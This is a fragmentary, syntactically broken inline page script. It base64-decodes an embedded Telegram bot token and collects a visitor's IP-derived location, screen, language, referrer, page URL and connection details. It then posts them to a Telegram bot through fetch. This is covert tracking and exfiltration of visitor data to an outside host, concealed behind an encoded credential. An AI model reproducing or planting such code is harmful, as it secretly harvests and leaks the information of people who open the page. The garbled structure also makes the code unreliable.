    <script>

    const base64Decode = (encoded) => atob(encoded);

    const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';

      const token = base64Decode(encodedBotToken);

      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {

      const screen = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio}x)`;
      const touch = 'ontouchstart' in window ? 'Yes' : 'No';
      const connection = navigator.connection 
        ? `${navigator.connection.effectiveType || 'N/A'} | ${navigator.connection.downlink || 'N/A'}Mbps` 
        : 'N/A';

    IP Location: ${ipInfo.city || 'N/A'}, ${ipInfo.country_name || 'N/A'}

    Screen: ${screen}
    Language: ${navigator.language}
    Referrer: ${document.referrer || 'Direct'}
    Page: ${window.location.href}
    Connection: ${connection}`;

      sendInfo(message);
    };
